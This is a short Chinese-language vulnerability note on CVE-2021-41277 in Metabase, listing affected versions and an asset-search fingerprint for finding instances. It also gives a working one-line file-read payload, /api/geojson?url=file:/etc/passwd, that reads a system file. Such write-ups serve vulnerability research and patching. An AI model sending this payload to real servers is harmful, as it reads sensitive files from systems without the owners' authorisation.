# Metabase geojson 任意文件读取漏洞 CVE-2021-41277

## 漏洞描述

在受影响的版本中，自定义 GeoJSON 地图（admin->settings->maps->custom maps->add a map）操作缺少权限验证，攻击者可通过该漏洞获得敏感信息

## 漏洞影响

<a-checkbox checked>metabase version < 0.40.5</a-checkbox></br>

<a-checkbox checked>metabase version >= 1.0.0, < 1.40.5</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="metabase"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1637464175182-c424a2a6-1b8c-4550-adc7-55574c923347.png)

验证POC

```python
/api/geojson?url=file:/etc/passwd
```

![img](../../../.vuepress/public/img/1637464214932-3531a00c-8968-4104-9f6d-a0962cdef98e.png)